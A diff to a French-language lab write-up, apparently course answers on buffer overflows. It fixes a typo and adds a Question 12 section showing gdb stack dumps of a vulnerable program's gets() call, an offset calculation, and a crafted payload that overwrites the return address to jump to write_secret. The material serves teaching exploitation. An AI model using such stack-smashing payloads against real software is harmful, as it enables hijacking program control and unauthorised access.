@@ -129,9 +129,48 @@ Donc on écrit en input :
 ```
 771675355\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x34\x85\x04\x8
 ~~~~~~~~~ ~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~
-adresse   fin  On remplit buf pour attendre buf[64]                 adresse de 
+adresse   fin  On remplit buf pour atteindre buf[64]                adresse de 
                                                                     write_secret 
                                                                     en 
                                                                     little-endian 
                                                                     (\x8 ou \x08)
+```
+
+## Question 12
+
+```
+(gdb) break wisdom-alt.c:62
+(gdb) cont
+Continuing.
+
+Breakpoint 1, put_wisdom () at wisdom-alt.c:62
+62        r = (int)gets(wis);
+(gdb) x/48wx $esp
+0xbffff320:     0x00000001      0x0804a098      0x00000012      0x00000020
+0xbffff330:     0x00000004      0x00000004      0x00000020      0x00000000
+0xbffff340:     0xbffff348      0xb7e9e411      0x00000000      0x00000000
+0xbffff350:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff360:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff370:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff380:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff390:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff3a0:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff3b0:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff3c0:     0x00000000      0x00000000      0x00000012      0xbffff400
+0xbffff3d0:     0x00000000      0xbffff800      0xbffff818      0x0804880d
+(gdb) print &write_secret
+$1 = (void (*)(void)) 0x8048534 <write_secret>
+(gdb) print &wis
+$2 = (char (*)[128]) 0xbffff348
+(gdb) backtrace
+#0  put_wisdom () at wisdom-alt.c:62
+#1  0x0804880d in main () at wisdom-alt.c:102
+```
+
+```
+>>> r = r"""0x00000000      0x00000000 0x00000000      0x00000000      0x00000000      0x00000000 0x00000000      0x00000000      0x00000000      0x00000000 0x00000000      0x00000000      0x00000000      0x00000000 0x00000000      0x00000000      0x00000000      0x00000000 0x00000000      0x00000000      0x00000000      0x00000000 0x00000000      0x00000000      0x00000000      0x00000000 0x00000000      0x00000000      0x00000000      0x00000000 0x00000000      0x00000000      0x00000012      0xbffff400 0x00000000      0xbffff800      0xbffff818""" # entre 0xbffff348 (&wis) et 0x0804880d (& de retour, pointe dans main)
+>>> len(r.split()) * 4
+148
+>>> print(r"A\x00" + "A"*(148-2) + r"\x34\x85\x04\x08") # 2 octets pour que gets() puisse lire, padding, et &write_secret little-endian
+A\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x34\x85\x04\x08
 ```
